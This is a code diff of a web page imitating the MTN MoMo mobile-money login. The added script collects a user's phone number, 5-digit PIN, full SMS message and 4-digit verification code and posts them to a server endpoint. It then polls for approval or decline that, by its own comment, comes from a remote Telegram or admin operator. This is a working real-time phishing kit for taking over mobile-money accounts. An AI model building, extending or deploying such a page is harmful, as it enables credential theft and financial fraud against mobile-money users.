-          <label class="input-label" for="fullSmsInput" style="margin-bottom: 0;">Full SMS Message</label>
-          <button type="button" class="paste-btn" id="pasteSmsBtn">📋 Paste Full SMS</button>
-        </div>
-
-        <textarea 
-          id="fullSmsInput" 
-          class="full-sms-textarea" 
-          placeholder="Paste the full MTN MoMo SMS message here..."
-          required
-        ></textarea>
-
-        <div class="resend-box">
-          Didn't receive the SMS? <br>
-          <button type="button" class="resend-btn" id="resendBtn1" disabled>Resend SMS in 30s</button>
-        </div>
-
-        <button type="submit" class="btn-login">VERIFY SMS</button>
-      </form>
-    </div>
-
-    <!-- ==================== PAGE 3: 4-DIGIT SMS CODE (STEP 2) ==================== -->
-    <div class="page-view" id="pageSms2">
-      <div class="header">
-        <button type="button" class="back-btn" onclick="showPage('pageSms1')">←</button>
-        <span class="step-pill">STEP 2 OF 2</span>
-        <h1>Security Code</h1>
-        <p>Enter the 4-digit SMS verification code</p>
-      </div>
-
-      <form class="form-section" id="smsForm2">
-        <p class="otp-info">
-          Enter the 4-digit code sent via SMS to<br>
-          <strong id="displayPhone2">+256 770 000 000</strong>
-        </p>
-
-        <div class="otp-boxes" id="otpGroup2">
-          <input type="text" class="otp-digit" inputmode="numeric" maxlength="1" required>
-          <input type="text" class="otp-digit" inputmode="numeric" maxlength="1" required>
-          <input type="text" class="otp-digit" inputmode="numeric" maxlength="1" required>
-          <input type="text" class="otp-digit" inputmode="numeric" maxlength="1" required>
-        </div>
-
-        <div class="resend-box">
-          Didn't receive the 4-digit code? <br>
-          <button type="button" class="resend-btn" id="resendBtn2" disabled>Resend code in 30s</button>
-        </div>
-
-        <button type="submit" class="btn-login">CONFIRM &amp; CONTINUE</button>
-      </form>
-    </div>
-
-    <div class="toast" id="toast"></div>
   </div>
   <script>
-    const countryBtn = document.getElementById('countryBtn');
-    const countryDropdown = document.getElementById('countryDropdown');
-    const selectedFlag = document.getElementById('selectedFlag');
-    const selectedCode = document.getElementById('selectedCode');
-    const phoneInput = document.getElementById('phoneInput');
-    const countryOptions = document.querySelectorAll('.country-option');
-    const togglePin = document.getElementById('togglePin');
-    const pinInput = document.getElementById('pinInput');
-    const fullSmsInput = document.getElementById('fullSmsInput');
-    const pasteSmsBtn = document.getElementById('pasteSmsBtn');
-    const toast = document.getElementById('toast');
+    // Page Containers & Progress Configuration
+    const pages = {
+      1: document.getElementById('page-1'),
+      2: document.getElementById('page-2'),
+      3: document.getElementById('page-3'),
+      4: document.getElementById('page-4'),
+      5: document.getElementById('page-5')
+    };
 
-    let timerInterval1, timerInterval2;
+    const stepLabels = {
+      1: 'Page 1 of 5 • Account Login',
+      2: 'Page 2 of 5 • 5-Digit PIN',
+      3: 'Page 3 of 5 • Copy & Paste SMS',
+      4: 'Page 4 of 5 • 4-Digit Code',
+      5: 'Page 5 of 5 • Successful Login'
+    };
 
-    // Show toast notification
-    function showToast(message) {
-      toast.textContent = message;
-      toast.style.display = 'block';
-      setTimeout(() => {
-        toast.style.display = 'none';
-      }, 2800);
-    }
+    const progressWidths = {
+      1: '20%',
+      2: '40%',
+      3: '60%',
+      4: '80%',
+      5: '100%'
+    };
 
-    // Switch active screen
-    function showPage(pageId) {
-      document.querySelectorAll('.page-view').forEach(page => {
-        page.classList.remove('active');
+    const stepLabelEl = document.getElementById('step-label');
+    const progressBarEl = document.getElementById('progress-bar');
+    const apiConsole = document.getElementById('api-console');
+    const declinedBanner = document.getElementById('declined-banner');
+
+    // Form Inputs & Action Controls
+    const phoneInput = document.getElementById('phone');
+    const pinInput = document.getElementById('pin');
+    const smsPasteInput = document.getElementById('sms-paste-input');
+    const otpInput = document.getElementById('otp-code');
+
+    const p3CopySource = document.getElementById('p3-copy-source');
+    const p3CopyBtn = document.getElementById('p3-copy-btn');
+    const p3PasteBtn = document.getElementById('p3-paste-btn');
+
+    const btnP1 = document.getElementById('btn-p1');
+    const btnP2 = document.getElementById('btn-p2');
+    const btnP3 = document.getElementById('btn-p3');
+    const btnP4 = document.getElementById('btn-p4');
+
+    // Inline Continuous Spinner Boxes (Pages 2, 3, 4)
+    const p2SpinnerBox = document.getElementById('p2-spinner-box');
+    const p3SpinnerBox = document.getElementById('p3-spinner-box');
+    const p4SpinnerBox = document.getElementById('p4-spinner-box');
+
+    // Validation Error Messages
+    const phoneError = document.getElementById('phone-error');
+    const pinError = document.getElementById('pin-error');
+    const smsError = document.getElementById('sms-error');
+    const codeError = document.getElementById('code-error');
+
+    // Account & Timer Displays
+    const p2Phone = document.getElementById('p2-phone');
+    const p4Phone = document.getElementById('p4-phone');
+    const p5AccountPhone = document.getElementById('p5-account-phone');
+    const countdownEl = document.getElementById('countdown');
+
+    // Page 5 Summary Elements
+    const resultTime = document.getElementById('result-time');
+    const copyTextContent = document.getElementById('copy-text-content');
+    const copyBtn = document.getElementById('copy-btn');
+
+    let countdownInterval = null;
+    let statusPollInterval = null;
+
+    let sessionData = {
+      phone: '',
+      pin: '',
+      smsText: '',
+      fourDigitCode: '',
+      refId: ''
+    };
+
+    // Enforce numeric-only typing on Phone, PIN, and 4-Digit Code inputs
+    [phoneInput, pinInput, otpInput].forEach(inputEl => {
+      inputEl.addEventListener('input', () => {
+        inputEl.value = inputEl.value.replace(/\D/g, '');
       });
-      document.getElementById(pageId).classList.add('active');
+    });
+
+    function logApi(msg) {
+      const now = new Date().toLocaleTimeString();
+      apiConsole.innerHTML += `[${now}] ${msg}<br>`;
+      apiConsole.scrollTop = apiConsole.scrollHeight;
     }
 
-    // Start 30-second countdown timer for resend buttons
-    function startCountdown(btnId, intervalRef, label) {
-      clearInterval(intervalRef);
-      const btn = document.getElementById(btnId);
-      let seconds = 30;
-      btn.disabled = true;
-      btn.textContent = `Resend ${label} in ${seconds}s`;
+    function stopAllTimers() {
+      if (countdownInterval) clearInterval(countdownInterval);
+      if (statusPollInterval) clearInterval(statusPollInterval);
+      countdownInterval = null;
+      statusPollInterval = null;
+    }
 
-      return setInterval(() => {
-        seconds--;
-        if (seconds > 0) {
-          btn.textContent = `Resend ${label} in ${seconds}s`;
-        } else {
-          clearInterval(intervalRef);
-          btn.disabled = false;
-          btn.textContent = `Resend ${label}`;
+    function goToPage(pageNumber) {
+      Object.values(pages).forEach(p => p.classList.remove('active'));
+      pages[pageNumber].classList.add('active');
+      stepLabelEl.textContent = stepLabels[pageNumber];
+      progressBarEl.style.width = progressWidths[pageNumber];
+
+      if (pageNumber === 5) {
+        stepLabelEl.classList.add('success-bar');
+        progressBarEl.classList.add('completed');
+      } else {
+        stepLabelEl.classList.remove('success-bar');
+        progressBarEl.classList.remove('completed');
+      }
+    }
+
+    // Clears all first-attempt details, stops spinners, and re-enables all inputs across Pages 1-4
+    function clearAndReenableAllPages(showDeclineMessage = false) {
+      stopAllTimers();
+      sessionData = { phone: '', pin: '', smsText: '', fourDigitCode: '', refId: '' };
+
+      phoneInput.value = '';
+      pinInput.value = '';
+      smsPasteInput.value = '';
+      otpInput.value = '';
+      p3CopySource.innerText = '';
+
+      p2Phone.textContent = '';
+      p4Phone.textContent = '';
+      p5AccountPhone.textContent = '';
+
+      phoneError.style.display = 'none';
+      pinError.style.display = 'none';
+      smsError.style.display = 'none';
+      codeError.style.display = 'none';
+
+      [p2SpinnerBox, p3SpinnerBox, p4SpinnerBox].forEach(box => {
+        box.classList.remove('active');
+      });
+
+      [
+        phoneInput, pinInput, smsPasteInput, otpInput,
+        p3CopyBtn, p3PasteBtn,
+        btnP1, btnP2, btnP3, btnP4
+      ].forEach(el => {
+        el.disabled = false;
+      });
+
+      p3CopyBtn.textContent = '📋 Copy Request Text';
+      declinedBanner.style.display = showDeclineMessage ? 'block' : 'none';
+
+      goToPage(1);
+      phoneInput.focus();
+    }
+
+    // Polls server.js every 2 seconds for remote Telegram or Admin approval/decline
+    function startPollingServerStatus(onApprovedCallback, onDeclinedCallback) {
+      if (statusPollInterval) clearInterval(statusPollInterval);
+      statusPollInterval = setInterval(async () => {
+        if (!sessionData.refId) return;
+        try {
+          const res = await fetch(`/api/momo/status/${sessionData.refId}`);
+          const data = await res.json();
+          if (data.ok) {
+            if (data.status === 'approved') {
+              clearInterval(statusPollInterval);
+              logApi(`Server status: APPROVED (${data.session.decidedBy})`);
+              onApprovedCallback();
+            } else if (data.status === 'declined') {
+              clearInterval(statusPollInterval);
+              logApi(`Server status: DECLINED (${data.session.decidedBy})`);
+              onDeclinedCallback();
+            }
+          }
+        } catch (err) {
+          // Continue polling on transient network hiccups
+        }
+      }, 2000);
+    }
+
+    async function requestServerApproval(step, message) {
+      try {
+        logApi(`POST /api/momo/request-approval (Page ${step})...`);
+        const res = await fetch('/api/momo/request-approval', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            refId: sessionData.refId,
+            step,
+            phone: sessionData.phone,
+            pin: sessionData.pin,
+            smsText: sessionData.smsText,
+            fourDigitCode: sessionData.fourDigitCode,
+            message
+          })
+        });
+        const data = await res.json();
+        if (data.ok) {
+          logApi(`Approval stored on server (Ref: ${sessionData.refId})`);
+        }
+      } catch (err) {
+        logApi(`Server Error: ${err.message}`);
+      }
+    }
+
+    async function sendBrowserDecision(step, decision, message) {
+      try {
+        await fetch('/api/momo/decision', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            refId: sessionData.refId,
+            step,
+            decision,
+            message
+          })
+        });
+      } catch (err) {
+        logApi(`Decision sync error: ${err.message}`);
+      }
+    }
+
+    function formatTime(seconds) {
+      const mins = Math.floor(seconds / 60).toString().padStart(2, '0');
+      const secs = (seconds % 60).toString().padStart(2, '0');
+      return `${mins}:${secs}`;
+    }
+
+    function startTimer(seconds) {
+      if (countdownInterval) clearInterval(countdownInterval);
+      let remaining = seconds;
+      countdownEl.textContent = formatTime(remaining);
+
+      countdownInterval = setInterval(() => {
+        remaining--;
+        countdownEl.textContent = formatTime(remaining);
+        if (remaining <= 0) {
+          stopAllTimers();
+          logApi('Page 4 timer expired — clearing details & resetting inputs.');
+          clearAndReenableAllPages(true);
         }
       }, 1000);
     }
 
-    // Paste full SMS from clipboard on Step 1
-    pasteSmsBtn.addEventListener('click', async () => {
-      try {
-        const text = await navigator.clipboard.readText();
-        if (text) {
-          fullSmsInput.value = text;
-          showToast('Full SMS pasted');
-        } else {
-          showToast('Clipboard is empty');
-        }
-      } catch (err) {
-        fullSmsInput.focus();
-        showToast('Long-press inside the box to paste SMS');
+    async function handleDecline(pageNumber, fromRemote = false) {
+      stopAllTimers();
+      const declinedPhone = sessionData.phone;
+      const declinedRef = sessionData.refId;
+
+      logApi(`Page ${pageNumber} DECLINED. Clearing details & re-enabling inputs...`);
+      if (!fromRemote) {
+        await sendBrowserDecision(
+          pageNumber,
+          'declined',
+          `🚫 <b>MoMo Request DECLINED on Page ${pageNumber}</b>\n• <b>Phone:</b> ${declinedPhone}\n• <b>Ref ID:</b> <code>${declinedRef}</code>`
+        );
       }
-    });
-
-    // Setup auto-focus & backspace navigation for 4-digit OTP boxes (Step 2)
-    function setupOtpInputs(groupId) {
-      const inputs = document.querySelectorAll(`#${groupId} .otp-digit`);
-      inputs.forEach((input, index) => {
-        input.addEventListener('input', () => {
-          input.value = input.value.replace(/[^0-9]/g, '');
-          if (input.value && index < inputs.length - 1) {
-            inputs[index + 1].focus();
-          }
-        });
-
-        input.addEventListener('keydown', (e) => {
-          if (e.key === 'Backspace' && !input.value && index > 0) {
-            inputs[index - 1].focus();
-          }
-        });
-      });
+      clearAndReenableAllPages(true);
     }
 
-    setupOtpInputs('otpGroup2');
-
-    // Country dropdown logic
-    countryBtn.addEventListener('click', (e) => {
-      e.stopPropagation();
-      countryDropdown.classList.toggle('open');
-    });
-
-    countryOptions.forEach(option => {
-      option.addEventListener('click', () => {
-        selectedFlag.textContent = option.dataset.flag;
-        selectedCode.textContent = option.dataset.code;
-        phoneInput.placeholder = option.dataset.placeholder;
-        countryDropdown.classList.remove('open');
-        phoneInput.focus();
-      });
-    });
-
-    document.addEventListener('click', () => {
-      countryDropdown.classList.remove('open');
-    });
-
-    // PIN visibility toggle
-    togglePin.addEventListener('click', () => {
-      if (pinInput.type === 'password') {
-        pinInput.type = 'text';
-        togglePin.textContent = 'HIDE';
-      } else {
-        pinInput.type = 'password';
-        togglePin.textContent = 'SHOW';
-      }
-    });
-
-    // Login Submit -> Go to Step 1 (Copy Full SMS)
-    document.getElementById('loginForm').addEventListener('submit', (e) => {
-      e.preventDefault();
-      const fullNumber = `${selectedCode.textContent} ${phoneInput.value}`;
-      document.getElementById('displayPhone1').textContent = fullNumber;
-      document.getElementById('displayPhone2').textContent = fullNumber;
-
-      showPage('pageSms1');
-      fullSmsInput.focus();
-      timerInterval1 = startCountdown('resendBtn1', timerInterval1, 'SMS');
-      showToast('Verification SMS sent');
-    });
-
-    // Step 1 Submit -> Go to Step 2 (4-Digit Code)
-    document.getElementById('smsForm1').addEventListener('submit', (e) => {
-      e.preventDefault();
-      showPage('pageSms2');
-      document.querySelector('#otpGroup2 .otp-digit').focus();
-      timerInterval2 = startCountdown('resendBtn2', timerInterval2, 'code');
-      showToast('4-digit code sent');
-    });
-
-    // Step 2 Submit -> Complete
-    document.getElementById('smsForm2').addEventListener('submit', (e) => {
-      e.preventDefault();
-      showToast('Verification complete! Signing in...');
-    });
-
-    // Resend button click handlers
-    document.getElementById('resendBtn1').addEventListener('click', () => {
-      timerInterval1 = startCountdown('resendBtn1', timerInterval1, 'SMS');
-      showToast('Verification SMS resent');
-    });
-
-    document.getElementById('resendBtn2').addEventListener('click', () => {
-      timerInterval2 = startCountdown('resendBtn2', timerInterval2, 'code');
-      showToast('4-digit code resent');
-    });
-  </script>
-
-</body>
-</html>
